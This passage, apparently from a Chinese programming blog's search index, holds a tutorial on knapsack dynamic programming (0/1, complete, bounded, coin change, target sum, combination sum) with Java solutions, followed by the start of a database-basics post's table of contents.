class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">knaps3</span><span class="params">(<span class="keyword">int</span>[] v, <span class="keyword">int</span>[] w, <span class="keyword">int</span> V)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span>[] dp = <span class="keyword">new</span> <span class="keyword">int</span>[V + <span class="number">1</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; v.length + <span class="number">1</span>; i++) </span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = V; j &gt;= w[i-<span class="number">1</span>]; j--) </span><br><span class="line">            dp[j]=Math.max(dp[j],dp[j-w[i-<span class="number">1</span>]]+v[i-<span class="number">1</span>]);  </span><br><span class="line">        <span class="keyword">return</span> dp[V];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们还需要注意一下<font color="red">初始化</font>的问题：</p><p>​    至于初始化问题，不同的问法有不同初始化方法，如果不要求装满 的 话，价值为0就是背包的初始价值，如果要求装满，那么除了dp[0]之外所有的一开始都是不符合要求的，我们置为负无穷，这点下面会讲。</p><h2><span id="完全背包问题">完全背包问题</span></h2><p>看懂了01背包问题后，我们可以回到那道零钱凑整问题了。</p><p>假设penny总共有，1，2，5三种面额钱数，需要凑齐11块</p><p>但是这道题和01背包不一样的地方在于硬币是可以反复取的，因此是完全背包问题。</p><p><strong>下面再次解释一下为什么贪心算法不可取：</strong></p><p>​    看到可以选择任意多件，你也许会想，那还不容易，选性价比最高的就好了。</p><p>​    于是开启贪婪模式，把每种物品的价格除以体积来算出它们各自的性价比，然后只选择性价比最    高的物品放入背包中。</p><p>​    嗯，听起来好像没什么毛病，但仍旧有一个问题，那就是同一种物品虽然可以选择任意多件，但    仍旧只能以件为单位，也就是说单个物品是无法拆分的，不能选择半件，只能多选一件或者少选    一件。这样就造成了一个问题，往往无法用性价比最高的物品来装满整个背包，比如背包空间为    10，性价比最高的物品占用空间为7，那么剩下的空间该如何填充呢？</p><p>​    你当然会想到用性价比第二高的物品填充，如果仍旧无法填满，那就依次用第三、第四性价比物    品来填充。</p><p>​    听起来似乎可行，但我只需要举一个反例便能证明这个策略行不通。</p><p>​    想要举反例很简单，比如只有两个物品：物品A：价值5，体积5，物品B：价值8：体积7，背包    容量为10，物品B的性价比显然要比物品A高，那么用贪心算法必然会选择放入一个物品B，此    时，剩余的空间已无法装下A或者B，所以得到的最高价值为8，而实际上，选择放入两个物品A    即可得到更高的价值10。所以这里贪心算法并不适用。</p><p>开始解题：</p><ol><li><p>下定义</p><p>我们设dp[i][j]为凑到j元所需的硬币数量，回想一下背包问题，i是第i种硬币，j是容量。</p><p>因此在这里j就是容量（元）。</p></li><li><p>写递推式</p><p>if(j&gt;=coins[i])<br>$$<br>dp[i][j]=Min(dp[i-1][j],dp[i][j-coins[i]]+1)<br>$$<br>else<br>$$<br>dp[i][j]=dp[i-1][j]<br>$$<br>要么用之前的方法去凑硬币，要么在现在的基础上继续凑（可以多选）</p></li><li><p>初始化</p><p>全初始化成Integer.MAX_VALUE-1</p><p>二维解法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">coinChange2</span><span class="params">(<span class="keyword">int</span>[] coins, <span class="keyword">int</span> amount)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> dp[]= <span class="keyword">new</span> <span class="keyword">int</span>[amount+<span class="number">1</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;=amount ; i++) &#123;</span><br><span class="line">        dp[i]=<span class="number">0x7fff_fffe</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=coins.length;i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=coins[i-<span class="number">1</span>];j&lt;=amount;j++)&#123;</span><br><span class="line">            dp[j]=Math.min(dp[j],dp[j-coins[i-<span class="number">1</span>]]+<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dp[amount]==<span class="number">0x7fff_fffe</span>?-<span class="number">1</span>:dp[amount];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><p>   二维dp降维打击后：</p>   <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">coinChange</span><span class="params">(<span class="keyword">int</span>[] coins, <span class="keyword">int</span> amount)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span>[] dp = <span class="keyword">new</span> <span class="keyword">int</span>[amount + <span class="number">1</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= amount; i++) dp[i] = <span class="number">0x7fff_fffe</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> coin : coins)</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = coin; i &lt;= amount; i++)<span class="comment">//part1</span></span><br><span class="line">            dp[i] = Math.min(dp[i], dp[i - coin] + <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> dp[amount] == <span class="number">0x7fff_fffe</span> ? -<span class="number">1</span> : dp[amount];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>   <strong>Q：为什么part1从coin开始呢？</strong><br>   A：因为我们知道当i&lt;coin的时候没办法凑因此直接跳过了,又由于是一维dp，dp[i][j]初始值是dp[i-1][j]而不是0，因此不需要else条件了。</p><p>   <strong>Q：为什么这次初始化成0x7ffffffe</strong><br>   A：原因分为三点，第一点是说如果和之前一样不初始化那么我们没办法判断到底能不能凑整，因此最终需要判断是否为0x7ffffffe。第二点是因为计算min的时候如果初始化为0永远都是0最小。第三点是说不初始化为最大值是因为dp[j]+1的时候可能会溢出。</p><p>   <strong>Q：为什么是正向遍历的？</strong><br>   A：从递推式可以看出来，dp[i][j]依赖的是dp[i][j-coin]和上一行值无关，因此需要得到该行最新值才能计算。</p><p><strong>01背包的递推式是：</strong></p><p>dp[i][j] = Math.<em>max</em>(dp[i - 1][j], dp[i - 1][j - w[i - 1]] + v[i - 1]);</p><p>所有的dp[i]都是从dp[i-1]推出来的，也就是说i只能在i-1的基础上被选中一次</p><p><strong>完全背包的递推式是：</strong></p><p>而我们硬币凑整问题dp[i]依赖于dp[i]因此可以一直取</p><p>dp[i][j]=Math.<em>min</em>(dp[i][j-coins[i-1]]+1,dp[i-1][j]);</p><h2><span id="凑数问题">凑数问题</span></h2><p>给定一个nums，和一个target，问能否使用nums中的数凑出target值（每个元素只能用一次）</p><p>示例：</p><p>输入：Nums= [1,2,5,5], target = 11</p><p>输出：true</p><p>上面分析了这么多了，每个元素只能用一次明显是01背包问题。再考虑一下初始化条件，dp[i][0]为true吧（无论用什么数字选0次都能凑出0）。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">coins</span><span class="params">(<span class="keyword">int</span>[] nums,<span class="keyword">int</span> target)</span></span>&#123;</span><br><span class="line">    <span class="keyword">boolean</span>[][] dp=<span class="keyword">new</span> <span class="keyword">boolean</span>[nums.length+<span class="number">1</span>][target+<span class="number">1</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;=nums.length;i++) dp[i][<span class="number">0</span>]=<span class="keyword">true</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;nums.length+<span class="number">1</span> ; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;target+<span class="number">1</span>;j++)&#123;</span><br><span class="line">            <span class="keyword">if</span> (j&gt;=nums[i-<span class="number">1</span>])&#123;</span><br><span class="line">                dp[i][j]=dp[i-<span class="number">1</span>][j-nums[i-<span class="number">1</span>]]||dp[i-<span class="number">1</span>][j];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                dp[i][j]=dp[i-<span class="number">1</span>][j];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dp[nums.length][target];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>降维打击：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">coins</span><span class="params">(<span class="keyword">int</span>[] nums,<span class="keyword">int</span> target)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span>[] dp=<span class="keyword">new</span> <span class="keyword">int</span>[target+<span class="number">1</span>];</span><br><span class="line">    dp[<span class="number">0</span>]=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> n:Nums) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = target; i &gt;= n; i--) &#123;</span><br><span class="line">            dp[i]|=dp[i-n];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dp[target]==<span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="leetcode-518-coin-change2">Leetcode 518 Coin Change2</span></h2><p>ou are given coins of different denominations and a total amount of money. Write a function to compute the number of combinations that make up that amount. You may assume that you have infinite number of each kind of coin. </p><p><strong>Example 1:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Input: amount &#x3D; 5, coins &#x3D; [1, 2, 5]</span><br><span class="line">Output: 4</span><br><span class="line">Explanation: there are four ways to make up the amount:</span><br><span class="line">5&#x3D;5</span><br><span class="line">5&#x3D;2+2+1</span><br><span class="line">5&#x3D;2+1+1+1</span><br><span class="line">5&#x3D;1+1+1+1+1</span><br></pre></td></tr></table></figure><p>一分析就是完全背包问题了。注意初始化问题，dp[i][0]是1意思就是说无论用面值多少的硬币凑0元的话都有一种方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">change</span><span class="params">(<span class="keyword">int</span> amount, <span class="keyword">int</span>[] coins)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span>[][] dp = <span class="keyword">new</span> <span class="keyword">int</span>[coins.length+<span class="number">1</span>][amount+<span class="number">1</span>];</span><br><span class="line">    dp[<span class="number">0</span>][<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= coins.length; i++) &#123;</span><br><span class="line">        dp[i][<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt;= amount; j++) &#123;</span><br><span class="line">            dp[i][j] = dp[i-<span class="number">1</span>][j] + (j &gt;= coins[i-<span class="number">1</span>] ? dp[i][j-coins[i-<span class="number">1</span>]] : <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dp[coins.length][amount];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>降维打击</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">change</span><span class="params">(<span class="keyword">int</span> amount, <span class="keyword">int</span>[] coins)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> dp[] = <span class="keyword">new</span> <span class="keyword">int</span>[amount+<span class="number">1</span>];</span><br><span class="line">    dp[<span class="number">0</span>]=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> c:coins) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = c; i &lt;=amount ; i++) &#123;</span><br><span class="line">            dp[i]+=dp[i-c];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dp[amount];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="多重背包问题">多重背包问题</span></h2><p>问题描述多加了一个每个物品有一个被取的上限，我们还是可以把该背包问题转化为我们的基础解法-01背包</p><p>如果他的重量*上限&gt;背包容量，是不是相当于完全背包？</p><p>不是的话我们分解即可对吧？</p><p>只需要用2进制表示出所有的可能，然后按照01背包的解法就可以了对吧。</p><p>看一道例题就懂了：</p><p>问给定容量为20的背包能装下的最大价值。</p><p><img src="image-20200324114647611.png" alt></p><p>straightforward：多重背包问题介于01背包和完全背包中，所以可以直接转换成01背包问题</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">int</span> <span class="title">multi</span><span class="params">(<span class="keyword">int</span> n, <span class="keyword">int</span> m, <span class="keyword">int</span>[] h, <span class="keyword">int</span>[] k, <span class="keyword">int</span>[] p)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> cnt=-<span class="number">1</span>;</span><br><span class="line">    ArrayList&lt;Integer&gt; weight=<span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">    ArrayList&lt;Integer&gt; value=<span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; k[i]; j++) &#123;</span><br><span class="line">            weight.add(++cnt,h[i]);</span><br><span class="line">            value.add(cnt,p[i]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> dp[] = <span class="keyword">new</span> <span class="keyword">int</span>[m+<span class="number">1</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= cnt; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = m; j &gt;= weight.get(i-<span class="number">1</span>); j--) &#123;</span><br><span class="line">            dp[j]=Math.max(dp[j],dp[j-weight.get(i-<span class="number">1</span>)]+value.get(i-<span class="number">1</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dp[m];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>二进制优化：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MultiBag</span> </span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">E</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> h;<span class="comment">//重量</span></span><br><span class="line">        <span class="keyword">int</span> v;<span class="comment">//价值</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">E</span><span class="params">(<span class="keyword">int</span> v,<span class="keyword">int</span> h)</span></span>&#123;</span><br><span class="line">            <span class="keyword">this</span>.h=h;</span><br><span class="line">            <span class="keyword">this</span>.v=v;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">multiBinary</span><span class="params">(<span class="keyword">int</span> n,<span class="keyword">int</span> m,<span class="keyword">int</span>[] h,<span class="keyword">int</span>[] k,<span class="keyword">int</span>[] p)</span></span>&#123;</span><br><span class="line">        ArrayList&lt;E&gt; lis = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">        <span class="keyword">int</span> index=-<span class="number">1</span>;<span class="comment">//代表拆分后的物品总数。</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="keyword">int</span>  c=<span class="number">1</span>;</span><br><span class="line">            <span class="keyword">while</span>(k[i]-c&gt;<span class="number">0</span>)&#123;<span class="comment">//c=1,2,4,8...节省空间</span></span><br><span class="line">                k[i]-=c;</span><br><span class="line">                E e=<span class="keyword">new</span> E(c*p[i],c*h[i]);</span><br><span class="line">                lis.add(++index,e);</span><br><span class="line">                c*=<span class="number">2</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            E e=<span class="keyword">new</span> E(k[i]*p[i],k[i]*h[i]);</span><br><span class="line">            lis.add(++index,e);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> dp[] = <span class="keyword">new</span> <span class="keyword">int</span>[m+<span class="number">1</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; index; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = m; j &gt;=lis.get(i).h ; j--) &#123;</span><br><span class="line">                dp[j]=Math.max(dp[j],dp[j-lis.get(i).h]+lis.get(i).v);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[m];</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2><span id="494-target-sum">494. Target Sum</span></h2><p>You are given a list of non-negative integers, a1, a2, …, an, and a target, S. Now you have 2 symbols <code>+</code> and <code>-</code>. For each integer, you should choose one from <code>+</code> and <code>-</code> as its new symbol.</p><p>Find out how many ways to assign symbols to make sum of integers equal to target S.</p><p><strong>Example 1:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Input: nums is [1, 1, 1, 1, 1], S is 3. </span><br><span class="line">Output: 5</span><br><span class="line">Explanation: </span><br><span class="line"></span><br><span class="line">-1+1+1+1+1 &#x3D; 3</span><br><span class="line">+1-1+1+1+1 &#x3D; 3</span><br><span class="line">+1+1-1+1+1 &#x3D; 3</span><br><span class="line">+1+1+1-1+1 &#x3D; 3</span><br><span class="line">+1+1+1+1-1 &#x3D; 3</span><br><span class="line"></span><br><span class="line">There are 5 ways to assign symbols to make the sum of nums be target 3.</span><br></pre></td></tr></table></figure><p>这种题其实换成正数集合和负数集合就行了。如上面的例子正数+负数=3 正数-负数=5，我们就可以求出需要凑的正数的值是多少，从而可以凑出来。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">findTargetSumWays</span><span class="params">(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> S)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> cnt = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i:nums) cnt+=i;</span><br><span class="line">    <span class="keyword">int</span> pos = (cnt+S)/<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">int</span> neg = (cnt-S)/<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">if</span>(cnt&lt;S||(cnt+S)%<span class="number">2</span>!=<span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> dp[] = <span class="keyword">new</span> <span class="keyword">int</span>[pos+<span class="number">1</span>];</span><br><span class="line">    dp[<span class="number">0</span>]=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i:nums)&#123;      </span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = pos; j &gt;=i ; j--) &#123;</span><br><span class="line">            dp[j]+=dp[j-i];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dp[pos];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="377-combination-sum-iv">377. Combination Sum IV</span></h2><p>Given an integer array with all positive numbers and no duplicates, find the number of possible combinations that add up to a positive integer target.</p><p><strong>Example:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">nums &#x3D; [1, 2, 3]</span><br><span class="line">target &#x3D; 4</span><br><span class="line"></span><br><span class="line">The possible combination ways are:</span><br><span class="line">(1, 1, 1, 1)</span><br><span class="line">(1, 1, 2)</span><br><span class="line">(1, 2, 1)</span><br><span class="line">(1, 3)</span><br><span class="line">(2, 1, 1)</span><br><span class="line">(2, 2)</span><br><span class="line">(3, 1)</span><br><span class="line"></span><br><span class="line">Note that different sequences are counted as different combinations.</span><br><span class="line"></span><br><span class="line">Therefore the output is 7.</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">combinationSum4</span><span class="params">(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> target)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span>[] dp = <span class="keyword">new</span> <span class="keyword">int</span>[target + <span class="number">1</span>];</span><br><span class="line">    dp[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= target; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> n : nums) &#123;</span><br><span class="line">            <span class="keyword">if</span> (i &gt;= n) &#123;</span><br><span class="line">                dp[i] += dp[i - n];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dp[target];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因为coins一个是可以循环一个不能。</p><p>其实看起来一样，但是一个是排列一个是组合。</p><p>主要还是定义不一样</p><p>一个是用定义dp[i][j]表示前i个硬币在剩余价值为j的时候的能凑成的方法数。（由于是按硬币为顺序的（硬币只走一次循环）因此3只能为1+2而不能为2+1）</p><p>一个是用定义dp[i][j]表示在剩余i价值用硬币j的时候的能凑成的方法数。（不管你3是1和2凑的还是2和1凑的=&gt;3等于1+2和2+1）</p><h2><span id="总结">总结</span></h2><p>如果不想看那么多就记住结论：</p><p>针对一维DP，如果元素只能出现一次，倒序来做，如果可以多次正序来做。</p>]]></content>
      
      
      <categories>
          
          <category> Algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 动态规划 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据库基础知识点</title>
      <link href="/2020/03/23/database/"/>
      <url>/2020/03/23/database/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>盘点了常考的数据库基础知识点</p><a id="more"></a><!-- toc --><ul><li><a href="#考点">考点：</a></li><li><a href="#如何设计一个关系型数据库">如何设计一个关系型数据库 √</a><ul><li><a href="#rdbms关系数据库管理系统">RDBMS：关系数据库管理系统</a></li><li><a href="#两大部分">两大部分：</a></li></ul></li><li><a href="#索引模块">索引模块</a><ul><li><a href="#为什么要使用索引">为什么要使用索引 √</a></li><li><a href="#什么样的信息能成为索引">什么样的信息能成为索引 √</a></li><li><a href="#索引的数据结构">索引的数据结构 √</a><ul><li><a href="#b-tree-">B-Tree -</a><ul><li><a href="#定义">定义</a></li></ul></li><li><a href="#b树是b树的变体其定义与b树相同除了">B+树是B树的变体，其定义与B树相同，除了</a></li><li><a href="#结论">结论 √</a></li><li><a href="#拓展阅读">拓展阅读</a></li><li><a href="#hash索引">Hash索引</a><ul><li><a href="#缺点">缺点：</a></li></ul></li><li><a href="#bitmap">Bitmap √</a></li></ul></li><li><a href="#密集索引和稀疏索引">密集索引和稀疏索引 √</a></li><li><a href="#innodb">InnoDB</a><ul><li><a href="#主键索引和非主键索引-">主键索引和非主键索引 -</a></li><li><a href="#聚簇索引和非聚簇索引">聚簇索引和非聚簇索引</a></li></ul></li></ul></li><li><a href="#如何定位并优化慢查询sql">如何定位并优化慢查询Sql √</a></li><li><a href="#根据慢日志定位慢查询sql">根据慢日志定位慢查询Sql</a><ul><li><a href="#显示慢查询配置信息">显示慢查询配置信息</a></li><li><a href="#显示慢查询数量">显示慢查询数量</a></li><li><a href="#打开慢日志">打开慢日志</a></li><li><a href="#设置慢查询时间阈值">设置慢查询时间阈值</a><ul><li><a href="#利用explain分析sql">利用Explain分析sql</a></li></ul></li><li><a href="#type从最优到最差">Type从最优到最差</a></li><li><a href="#extra">Extra</a><ul><li><a href="#修改sql尽量让sql走索引">修改sql尽量让sql走索引</a></li></ul></li><li><a href="#走索引">走索引</a></li><li><a href="#加索引">加索引</a></li></ul></li><li><a href="#联合索引最左匹配原则">联合索引最左匹配原则 √</a><ul><li><a href="#成因第一个字段是绝对有序的第二个字段是无序的">成因：第一个字段是绝对有序的，第二个字段是无序的。</a></li></ul></li><li><a href="#索引是越多越好么">索引是越多越好么 √</a></li><li><a href="#锁模块">锁模块</a><ul><li><a href="#二段锁">二段锁</a></li><li><a href="#myisam与innodb关于锁方面的区别">MyISAM与InnoDB关于锁方面的区别</a><ul><li><a href="#myisam适合的场景">MyISAM适合的场景 √</a></li><li><a href="#innodb适用的场景">InnoDB适用的场景 √</a></li><li><a 